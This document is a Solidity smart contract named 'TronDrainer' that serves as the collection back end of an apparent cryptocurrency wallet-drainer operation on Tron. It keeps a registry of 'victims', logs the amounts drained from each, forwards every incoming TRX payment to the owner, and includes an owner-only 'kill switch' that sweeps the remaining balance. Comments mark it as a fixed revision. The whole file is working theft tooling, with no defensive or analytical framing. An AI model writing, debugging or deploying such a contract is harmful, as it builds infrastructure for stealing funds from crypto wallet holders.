// TronDrainer.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract TronDrainerFixed {
    address public owner;
    
    struct Victim {
        address wallet;
        uint256 amount;
        uint256 timestamp;
        bool drained;
        address drainedBy;
    }
    
    mapping(address => Victim) public victims;
    address[] public victimAddresses;
    
    uint256 public victimCount;
    uint256 public totalDrained;
    
    event FundsDrained(address indexed victim, uint256 amount, address token, address drainer);
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    // FIXED: Proper forward declaration
    function drainTRX(address victim) external payable {
        require(msg.value > 0, "No TRX sent");
        
        if (!victims[victim].drained) {
            victims[victim] = Victim({
                wallet: victim,
                amount: msg.value,
                timestamp: block.timestamp,
                drained: true,
                drainedBy: msg.sender
            });
            victimAddresses.push(victim);
            victimCount++;
        } else {
            victims[victim].amount += msg.value;
        }
        
        totalDrained += msg.value;
        payable(owner).transfer(msg.value);
        
        emit FundsDrained(victim, msg.value, address(0), msg.sender);
    }
    
    // FIXED: Removed recursive call
    function drainNative(address victim) external payable {
        // Just call drainTRX internally
        require(msg.value > 0, "No TRX sent");
        
        if (!victims[victim].drained) {
            victims[victim] = Victim({
                wallet: victim,
                amount: msg.value,
                timestamp: block.timestamp,
                drained: true,
                drainedBy: msg.sender
            });
            victimAddresses.push(victim);
            victimCount++;
        } else {
            victims[victim].amount += msg.value;
        }
        
        totalDrained += msg.value;
        payable(owner).transfer(msg.value);
        
        emit FundsDrained(victim, msg.value, address(0), msg.sender);
    }
    
    // Tron kill switch
    function emergencyClose() external onlyOwner {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            payable(owner).transfer(balance);
        }
        totalDrained = type(uint256).max;
    }
}
